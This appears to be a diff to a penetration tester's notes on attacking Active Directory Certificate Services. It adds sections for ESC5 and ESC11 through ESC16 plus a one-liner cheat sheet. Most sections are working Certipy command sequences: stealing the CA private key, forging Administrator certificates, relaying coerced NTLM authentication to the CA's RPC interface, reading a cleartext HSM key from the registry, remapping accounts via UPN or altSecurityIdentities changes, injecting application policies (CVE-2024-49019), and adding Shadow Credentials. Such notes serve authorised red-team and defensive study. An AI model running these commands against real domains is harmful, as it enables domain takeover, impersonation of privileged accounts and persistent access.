@@ -25,6 +25,8 @@ Active Directory Certificate Services — Microsoft PKI implementation. Issues d
 | SAN | Subject Alternative Name — alternate identities in cert |
 | PKINIT | Kerberos extension for certificate-based auth |
 | NTLM Relay | Relay auth to `/certsrv/` endpoint for cert issuance |
+| Shadow Credentials | Writing `msDS-KeyCredentialLink` on an account to add an attacker-controlled key-trust credential (used in ESC16) |
+| OID Group Link | `msDS-OIDToGroupLink` — links an Issuance Policy OID to a universal AD group, so enrolling implies group membership (ESC13) |
 
 ---
 
@@ -33,16 +35,16 @@ Active Directory Certificate Services — Microsoft PKI implementation. Issues d
 | Tool | Use |
 |---|---|
 | [[Tools/AD/Certipy\|Certipy]] | Primary Linux tool — enumerate templates/CAs, request/forge certificates, PKINIT auth |
-| Certify.exe | Windows C# enumeration/request tool ([GhostPack](https://github.com/GhostPack/Certify)) — no vault note yet |
+| [[Tools/AD/Certify\|Certify.exe]] | Windows C# enumeration/request tool (GhostPack) |
 | [[Tools/Lateral Movement/Rubeus\|Rubeus]] | Windows — request TGT from a certificate, inject ticket |
-| PKINITtools | Linux PKINIT auth scripts, `gettgtpkinit.py` / `getnthash.py` ([dirkjanm](https://github.com/dirkjanm/PKINITtools)) — no vault note yet |
+| [[Tools/AD/PKINITtools\|PKINITtools]] | Linux PKINIT auth scripts, `gettgtpkinit.py` / `getnthash.py` |
 | [[Tools/Lateral Movement/impacket\|impacket]] | `secretsdump.py`, general post-cert tooling |
 | [[Tools/Lateral Movement/ntlmrelayx\|ntlmrelayx]] | Relay coerced NTLM auth to the CA Web Enrollment endpoint (ESC8) |
 | [[Tools/Credential Dumping/secretsdump\|secretsdump]] | DCSync using a recovered machine-account hash |
 | [[Tools/Auth/impacket-psexec\|impacket-psexec]] | PtH/PtT shell after obtaining a cert-derived hash or ticket |
 | [[Tools/Lateral Movement/Evil WinRM\|evil-winrm]] | WinRM shell using a cert-derived NT hash |
-| PetitPotam.py | Coerce NTLM auth (MS-EFSRPC, unauth on unpatched) for ESC8 — no vault note yet |
-| printerbug.py | Coerce NTLM auth (MS-RPRN) for ESC8 — no vault note yet; see [[Tools/Lateral Movement/Coercer\|Coercer]] for a maintained multi-technique alternative |
+| [[Tools/Lateral Movement/PetitPotam\|PetitPotam.py]] | Coerce NTLM auth (MS-EFSRPC, unauth on unpatched) for ESC8 |
+| [[Tools/Lateral Movement/PrinterBug\|printerbug.py]] | Coerce NTLM auth (MS-RPRN) for ESC8; see [[Tools/Lateral Movement/Coercer\|Coercer]] for a maintained multi-technique alternative |
 
 ---
 
@@ -186,6 +188,22 @@ certipy template -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> \
   -template '<Template>' -configuration <saved_config>
 ```
 
+### ESC5 — Vulnerable PKI Object Access Control
+
+**Conditions:** attacker has control (WriteDACL/WriteOwner/GenericAll) over a PKI-related AD object other than a template — the CA server's computer object, the CA's AD container, the NTAuthCertificates object, or the Certificate Templates container. Local admin on the CA server is the most direct path, since it grants access to the private key on disk.
+
+```bash
+# With local admin on the CA server — extract CA cert + private key
+certipy ca -ca '<CA_Name>' -backup -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip>
+# Output: <CA_Name>.pfx
+
+# Forge a certificate for any user with the stolen CA key
+certipy forge -ca-pfx '<CA_Name>.pfx' -upn Administrator@<domain> -crl 'ldap:///'
+
+# Authenticate
+certipy auth -pfx Administrator_forged.pfx -dc-ip <dc_ip>
+```
+
 ### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Flag on CA
 
 **Conditions:** CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` set, allowing SAN specification in *any* certificate request regardless of template settings.
@@ -260,6 +278,106 @@ certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -vulnerable -stdout
 # Follow certipy output guidance for ESC9/10 exploitation steps
 ```
 
+### ESC11 — NTLM Relay to ICPR (RPC, Not HTTP)
+
+**Conditions:** the CA's `ICertPassage` RPC interface (MS-ICPR) doesn't enforce RPC encryption/sealing (`IF_ENFORCEENCRYPTICERTREQUEST` unset) — same idea as ESC8, but over RPC instead of HTTP, so it works even when Web Enrollment isn't exposed.
+
+```bash
+# Relay coerced NTLM auth straight to the RPC interface
+certipy relay -target 'rpc://<CA_host>' -ca '<CA_Name>' -template DomainController
+
+# Coerce authentication (PetitPotam/PrinterBug/Coercer, same as ESC8)
+python3 PetitPotam.py -u '' -p '' <attacker_ip> <dc_ip>
+
+# Auth with the relayed cert as usual
+certipy auth -pfx <relayed>.pfx -dc-ip <dc_ip>
+```
+
+### ESC12 — CA Private Key on YubiHSM
+
+**Conditions:** the CA stores its private key on a YubiHSM2 module; the HSM auth key/password is stored in **cleartext** in the registry (`HKLM\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`), readable by anyone with local access to the CA server.
+
+```bash
+# On the CA server — read the HSM auth key from the registry
+reg query "HKLM\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword"
+
+# Use the recovered key with YubiHSM tooling to export the CA private key,
+# then forge certs exactly as in ESC5 once the key is recovered
+certipy forge -ca-pfx '<CA_Name>.pfx' -upn Administrator@<domain>
+```
+
+### ESC13 — Issuance Policy Linked to a Privileged Group
+
+**Conditions:** an enrollable template has an Issuance Policy extension whose OID is linked (`msDS-OIDToGroupLink`) to a universal AD group; enrolling grants membership-equivalent access to that group.
+
+```bash
+# Certipy find flags ESC13 automatically
+certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -vulnerable -stdout
+
+# Request a cert from the vulnerable template — group membership is implied by the policy OID
+certipy req -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> \
+  -ca '<CA_Name>' -template '<Vulnerable_Template>'
+
+# Authenticate — PKINIT grants a TGT with the linked group's privileges
+certipy auth -pfx <user>.pfx -dc-ip <dc_ip>
+```
+
+### ESC14 — Weak Explicit Certificate Mapping (altSecurityIdentities)
+
+**Conditions:** attacker has write access to a target account's `altSecurityIdentities` attribute (GenericWrite/WriteProperty), letting them map an attacker-controlled certificate to that (potentially privileged) account.
+
+```bash
+# Request a certificate as yourself (or a controlled machine account)
+certipy req -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -ca '<CA_Name>' -template Machine
+
+# Write your cert's identity into the target's altSecurityIdentities
+certipy account -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> \
+  -upn Administrator -user Administrator update
+
+# Authenticate as the target using your certificate
+certipy auth -pfx <user>.pfx -dc-ip <dc_ip> -username Administrator -domain <domain>
+```
+
+### ESC15 — EKUwu / Application Policy Injection (CVE-2024-49019)
+
+**Conditions:** enrollable Schema V1 template (e.g. the default `User` template) allows the requester to supply a Subject and a custom Application Policy OID; **unpatched CA** (patch released November 2024) doesn't validate that the Application Policy matches the template's intended EKU.
+
+```bash
+# Inject Client Authentication as an Application Policy on a V1 template
+certipy req -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> \
+  -ca '<CA_Name>' -template User \
+  -application-policies 'Client Authentication'
+
+# Or inject Certificate Request Agent to chain into an ESC3-style attack
+certipy req -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> \
+  -ca '<CA_Name>' -template User \
+  -application-policies '1.3.6.1.4.1.311.20.2.1'
+
+certipy auth -pfx <user>.pfx -dc-ip <dc_ip>
+```
+
+> [!warning]
+> Patched November 2024 — check the CA's patch level before assuming this works.
+
+### ESC16 — Security Extension (SID) Disabled CA-Wide
+
+**Conditions:** the CA has `szOID_NTDS_CA_SECURITY_EXT` (the SID security extension) globally disabled, so **no** certificate it issues carries the requester's SID — identical impact to ESC9, but applies to every template on the CA instead of just one.
+
+```bash
+# Certipy find flags ESC16 automatically
+certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -vulnerable -stdout
+
+# Set up Shadow Credentials on an account you can write to (or your own)
+certipy shadow -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -account '<victim>' auto
+
+# Change your own UPN to the target's, request a cert, then revert
+certipy account -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -upn Administrator -user <user> update
+certipy req -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -ca '<CA_Name>' -template User
+certipy account -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -upn <user> -user <user> update   # revert
+
+certipy auth -pfx <user>.pfx -dc-ip <dc_ip>
+```
+
 ### Post-DA — CA Key Theft & Certificate Forging
 
 Once you have Domain Admin (via any ESC above), the CA itself can be turned into a persistence/forging mechanism.
@@ -287,9 +405,16 @@ certipy auth -pfx Administrator_forged.pfx -dc-ip <dc_ip>
 | Any Purpose / No EKU on enrollable template | ESC2 | Same as ESC1 |
 | Enrollment Agent template accessible | ESC3 | Enroll on behalf of DA |
 | Write perms on template object | ESC4 | Modify template → ESC1 |
+| Weak ACL on CA object / NTAuthCertificates / CA server | ESC5 | Steal CA key → forge any cert |
 | `EDITF_ATTRIBUTESUBJECTALTNAME2` on CA | ESC6 | SAN on any cert request |
 | Manage CA / Manage Certs perms | ESC7 | Issue arbitrary certs |
 | Web Enrollment with NTLM + coercible auth | ESC8 | Relay DC auth → DC cert → DCSync |
+| ICPR RPC interface without enforced encryption | ESC11 | Relay NTLM over RPC → cert (works without Web Enrollment) |
+| CA private key on YubiHSM with cleartext registry auth key | ESC12 | Local CA access → extract key → forge any cert |
+| Issuance Policy OID linked to a universal group | ESC13 | Enroll → implied membership in linked group |
+| Writable `altSecurityIdentities` on a target account | ESC14 | Map attacker cert → privileged account |
+| Unpatched CA + V1 template allowing custom Subject | ESC15 (CVE-2024-49019) | Inject Application Policy → auth as any user |
+| SID security extension globally disabled on CA | ESC16 | Every issued cert loses SID binding → same impact as ESC9, CA-wide |
 
 ---
 
@@ -306,6 +431,10 @@ certipy auth -pfx Administrator_forged.pfx -dc-ip <dc_ip>
 | Backup CA key | `certipy ca -u Admin@domain -hashes :hash -dc-ip dc -ca CA -backup` |
 | Forge cert | `certipy forge -ca-pfx CA.pfx -upn Administrator@domain` |
 | DCSync post-ESC8 | `impacket-secretsdump -hashes :DC_hash 'domain/DC$'@dc_ip` |
+| ESC11 RPC relay | `certipy relay -target rpc://CA_host -ca CA_Name -template DomainController` |
+| ESC13 check | Look for "ESC13" in `certipy find -vulnerable -stdout` output |
+| ESC15 injected policy | `certipy req ... -application-policies 'Client Authentication'` |
+| ESC16 shadow creds | `certipy shadow -u user@domain -p pass -dc-ip dc -account victim auto` |
 
 ---
 
